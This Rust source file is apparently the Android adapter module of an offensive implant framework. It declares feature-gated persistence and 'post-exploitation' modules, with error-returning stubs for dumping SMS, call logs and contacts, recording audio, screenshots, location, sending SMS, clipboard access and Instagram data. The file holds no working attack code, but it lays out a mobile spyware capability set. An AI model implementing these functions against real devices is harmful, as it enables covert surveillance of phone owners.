//! Android platform adapter module.
//!
//! Provides Android-specific implementations of the platform abstraction
//! traits: environment validation, persistence, post-exploitation, and
//! JNI bridge helpers.  All modules are gated behind `#[cfg(target_os = "android")]`
//! in `lib.rs`.

pub mod env_checks;
pub mod jni_bridge;

// Persistence and post-exploitation modules require `mobile-postexp` feature.
// When absent, stubs return clear error messages rather than panicking.
#[cfg(all(target_os = "android", feature = "mobile-postexp"))]
pub mod persistence;

#[cfg(all(target_os = "android", not(feature = "mobile-postexp")))]
pub mod persistence {
    //! Stub — enable `mobile-postexp` feature for Android persistence.
    use anyhow::Result;
    pub fn install_schtask(_config: &crate::config::Config) -> Result<()> {
        Err(anyhow::anyhow!(
            "Android persistence requires the `mobile-postexp` feature"
        ))
    }
    pub fn remove_schtask() -> Result<()> {
        Err(anyhow::anyhow!(
            "Android persistence requires the `mobile-postexp` feature"
        ))
    }
    pub fn check_persistence() -> Result<bool> {
        Ok(false)
    }
    pub fn install_work_profile() -> Result<()> {
        Err(anyhow::anyhow!(
            "Android work profile persistence requires the `mobile-postexp` feature"
        ))
    }
    pub fn install_device_admin() -> Result<()> {
        Err(anyhow::anyhow!(
            "Android device admin persistence requires the `mobile-postexp` feature"
        ))
    }
}

#[cfg(all(target_os = "android", feature = "mobile-postexp"))]
pub mod post_exploitation;

#[cfg(all(target_os = "android", not(feature = "mobile-postexp")))]
pub mod post_exploitation {
    //! Stub — enable `mobile-postexp` feature for Android post-exploitation.
    use anyhow::Result;
    pub fn dump_sms() -> Result<String> {
        Err(anyhow::anyhow!(
            "Android post-exploitation requires the `mobile-postexp` feature"
        ))
    }
    pub fn dump_call_log() -> Result<String> {
        Err(anyhow::anyhow!(
            "Android post-exploitation requires the `mobile-postexp` feature"
        ))
    }
    pub fn dump_contacts() -> Result<String> {
        Err(anyhow::anyhow!(
            "Android post-exploitation requires the `mobile-postexp` feature"
        ))
    }
    pub fn dump_calendar() -> Result<String> {
        Err(anyhow::anyhow!(
            "Android post-exploitation requires the `mobile-postexp` feature"
        ))
    }
    pub fn list_installed_apps() -> Result<String> {
        Err(anyhow::anyhow!(
            "Android post-exploitation requires the `mobile-postexp` feature"
        ))
    }
    pub fn take_screenshot() -> Result<Vec<u8>> {
        Err(anyhow::anyhow!(
            "Android post-exploitation requires the `mobile-postexp` feature"
        ))
    }
    pub fn record_audio(_duration_secs: u64) -> Result<Vec<u8>> {
        Err(anyhow::anyhow!(
            "Android post-exploitation requires the `mobile-postexp` feature"
        ))
    }
    pub fn get_location() -> Result<String> {
        Err(anyhow::anyhow!(
            "Android post-exploitation requires the `mobile-postexp` feature"
        ))
    }
    pub fn send_sms(_to: &str, _body: &str) -> Result<()> {
        Err(anyhow::anyhow!(
            "Android post-exploitation requires the `mobile-postexp` feature"
        ))
    }
    pub fn read_clipboard() -> Result<String> {
        Err(anyhow::anyhow!(
            "Android post-exploitation requires the `mobile-postexp` feature"
        ))
    }
    pub fn write_clipboard(_text: &str) -> Result<()> {
        Err(anyhow::anyhow!(
            "Android post-exploitation requires the `mobile-postexp` feature"
        ))
    }
    pub fn enumerate_accounts() -> Result<String> {
        Err(anyhow::anyhow!(
            "Android post-exploitation requires the `mobile-postexp` feature"
        ))
    }
    pub fn instagram_data() -> Result<String> {
        Err(anyhow::anyhow!(
            "Android post-exploitation requires the `mobile-postexp` feature"
        ))
    }
}
